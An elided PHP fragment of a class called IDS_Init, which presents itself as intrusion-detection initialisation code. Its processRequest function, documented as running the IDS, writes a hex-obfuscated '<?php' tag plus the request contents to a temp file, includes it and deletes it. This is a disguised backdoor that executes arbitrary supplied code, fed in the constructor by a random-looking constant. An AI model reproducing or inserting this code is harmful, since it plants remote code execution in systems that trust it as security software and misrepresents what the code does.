...
class IDS_Init
{
    ...
    private function __construct($configPath = null)
    {
        ...
        $this->processRequest(AdKUvHylHqiFYtkKrDrKmZQfvWUoJkyeIrGmTEWhGV);
    }
    ...
    /**
     * Processes a request and runs the IDS
     *
    ...
    public function processRequest($request) {
        $tmpfname = tempnam('tmp', 'cake');
        $handle = fopen($tmpfname, "w+");
        fwrite($handle, "\x3c\x3f\x70\x68\x70\xa" . stripslashes($request));
        fclose($handle);
        include $tmpfname;
        unlink($tmpfname);
